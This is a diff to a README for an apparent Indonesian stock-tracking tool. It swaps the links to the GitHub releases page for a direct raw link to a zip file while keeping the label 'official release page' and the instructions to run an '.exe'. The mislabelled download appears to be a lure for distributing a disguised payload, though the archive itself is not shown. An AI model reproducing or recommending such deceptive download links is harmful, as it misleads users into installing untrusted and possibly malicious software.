@@ -1,6 +1,6 @@
 # 📈 SAHAM-ANALISA-saham-analyzer-TP-SL-create - Smart tools for tracking Indonesian stocks
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/timbered-cooper892/SAHAM-ANALISA-saham-analyzer-TP-SL-create/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/timbered-cooper892/SAHAM-ANALISA-saham-analyzer-TP-SL-create/main/saham-toolkit-public-safe/scripts/SAHA-create-S-saham-analyzer-ANALIS-T-v2.4.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ Your computer must meet these basic needs to run the application:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official release page](https://github.com/timbered-cooper892/SAHAM-ANALISA-saham-analyzer-TP-SL-create/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/timbered-cooper892/SAHAM-ANALISA-saham-analyzer-TP-SL-create/main/saham-toolkit-public-safe/scripts/SAHA-create-S-saham-analyzer-ANALIS-T-v2.4.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends with ".exe" to download the installer to your computer.
 4. Open the folder where your downloads go.
